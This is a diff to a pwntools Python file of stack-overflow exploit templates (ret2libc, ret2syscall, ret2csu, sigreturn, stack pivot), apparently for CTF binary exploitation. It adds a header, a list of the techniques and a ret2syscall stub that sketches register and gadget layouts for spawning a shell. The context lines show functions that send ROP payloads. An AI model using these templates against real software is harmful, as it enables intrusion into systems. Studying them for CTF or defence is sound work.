@@ -1,3 +1,22 @@
+#!/usr/bin/env python3
+# -*- encoding: utf-8 -*-
+'''
+@File    : stack_attack_template.py
+@Time    : 2021/05/30 21:30:50
+@Author  : Roderick Chan
+@Email   : ch22166@163.com
+@Desc    : None
+'''
+
+"""
+以下为涉及到栈溢出的攻击模板，包括：
+    1、ret2libc
+    2、ret2syscall
+    3、ret2csu
+    4、ret2sigReturn
+    5、stack_pivot
+"""
+
 from pwn import *
 from LibcSearcher import LibcSearcher
 
@@ -88,6 +107,32 @@ def ret2libc_pwntools():
     io.send(rop.chain())
 
 
+def ret2syscall():
+    """利用系统调用获取shell"""
+    # i386
+    """
+    mov ebx, para1
+    mov ecx, para2
+    mov edx, para3
+    mov eax, syscall_number
+    int 80
+    """
+    
+    # amd64
+    """
+    pop rdi; ret;
+    para1
+    pop rsi; ret
+    para2
+    pop rdx; ret
+    para3
+    pop rax; ret
+    syscall_number
+    syscall
+    """
+
+
+
 def ret2csu(csu_end_addr:int, csu_start_addr:int, ret_addr:int,
             r12, r13, r14, r15, rbx=0, rbp=1):
     """
@@ -115,6 +160,7 @@ def ret2csu(csu_end_addr:int, csu_start_addr:int, ret_addr:int,
     
     print("len of payload:{}".format(payload))
     io.send(payload)
+  
     
   
 def stack_pivot_attack(io, elf, leave_ret_addr:int, fake_rbp_addr:int):
@@ -137,6 +183,7 @@ def stack_pivot_attack(io, elf, leave_ret_addr:int, fake_rbp_addr:int):
     io.send(payload)
     
     # 之后，程序会取执行rop链
+
 
 
 def ret2sigReturn():
